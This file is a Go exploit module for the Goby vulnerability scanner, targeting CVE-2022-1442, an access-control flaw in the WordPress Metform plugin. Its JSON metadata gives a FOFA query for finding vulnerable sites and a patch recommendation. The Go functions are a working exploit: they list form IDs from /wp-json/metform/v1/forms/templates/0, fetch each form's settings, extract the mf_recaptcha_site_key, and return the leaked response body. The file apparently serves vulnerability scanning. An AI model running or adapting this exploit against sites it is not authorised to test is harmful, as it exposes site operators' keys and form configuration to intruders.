package exploits

import (
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "WordPress plugin Metform forms Information Disclosure (CVE-2022-1442)",
    "Description": "<p>WordPress plugin Metform is a secure contact form plugin for WordPress.</p><p>There is a security vulnerability in the WordPress plugin Metform. The vulnerability is caused by improper access control in the ~/core/forms/action.php file, and attackers can obtain various key information of users.</p>",
    "Product": "WordPress Metform",
    "Homepage": "https://wordpress.org/plugins/metform/",
    "DisclosureDate": "2022-11-13",
    "Author": "corp0ra1",
    "FofaQuery": "body=\"wp-content/plugins/metform/\"",
    "GobyQuery": "body=\"wp-content/plugins/metform/\"",
    "Level": "2",
    "Impact": "<p>There is a security vulnerability in the WordPress plugin Metform. The vulnerability is caused by improper access control in the ~/core/forms/action.php file, and attackers can obtain various key information of users.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://wordpress.org/plugins/metform/\">https://wordpress.org/plugins/metform/</a></p>",
    "References": [
        "https://gist.github.com/Xib3rR4dAr/6e6c6e5fa1f8818058c7f03de1eda6bf"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2022-1442"
    ],
    "CNNVD": [
        "CNNVD-202205-2880"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "WordPress Metform 插件 forms 文件信息泄露漏洞（CVE-2022-1442）",
            "Product": "WordPress Metform",
            "Description": "<p>WordPress plugin Metform 是WordPress的一款安全联系表单插件。<br></p><p>WordPress plugin Metform存在安全漏洞，该漏洞源于~/core/forms/action.php文件存在访问控制不当，攻击者可获取用户的各种秘钥信息。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://wordpress.org/plugins/metform/\">https://wordpress.org/plugins/metform/</a><br></p>",
            "Impact": "<p>WordPress plugin Metform存在安全漏洞，该漏洞源于~/core/forms/action.php文件存在访问控制不当，攻击者可获取用户的各种秘钥信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "WordPress plugin Metform forms Information Disclosure (CVE-2022-1442)",
            "Product": "WordPress Metform",
            "Description": "<p>WordPress plugin Metform is a secure contact form plugin for WordPress.<br></p><p>There is a security vulnerability in the WordPress plugin Metform. The vulnerability is caused by improper access control in the ~/core/forms/action.php file, and attackers can obtain various key information of users.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://wordpress.org/plugins/metform/\">https://wordpress.org/plugins/metform/</a><br></p>",
            "Impact": "<p>There is a security vulnerability in the WordPress plugin Metform. The vulnerability is caused by improper access control in the ~/core/forms/action.php file, and attackers can obtain various key information of users.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10769"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/wp-json/metform/v1/forms/templates/0"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "<option value=") {
				formsId := regexp.MustCompile("<option value=\"([0-9]+)\"").FindAllStringSubmatch(resp.RawBody, -1)
				for i := 0; i < len(formsId); i++ {
					uri2 := "/wp-json/metform/v1/forms/get/" + formsId[i][1]
					cfg2 := httpclient.NewGetRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil && strings.Contains(resp2.RawBody, "mf_recaptcha_site_key") {
						keyFind := regexp.MustCompile("\"mf_recaptcha_site_key\":\"(.*?)\",").FindStringSubmatch(resp2.RawBody)
						if keyFind[1] != "" {
							return true
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/wp-json/metform/v1/forms/templates/0"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "<option value=") {
				formsId := regexp.MustCompile("<option value=\"([0-9]+)\"").FindAllStringSubmatch(resp.RawBody, -1)
				for i := 0; i < len(formsId); i++ {
					uri2 := "/wp-json/metform/v1/forms/get/" + formsId[i][1]
					cfg2 := httpclient.NewGetRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && strings.Contains(resp2.RawBody, "mf_recaptcha_site_key") {
						keyFind := regexp.MustCompile("\"mf_recaptcha_site_key\":\"(.*?)\",").FindStringSubmatch(resp2.RawBody)
						if keyFind[1] != "" {
							expResult.Output = resp2.RawBody
							expResult.Success = true
						}
					}
				}
			}
			return expResult
		},
	))
}
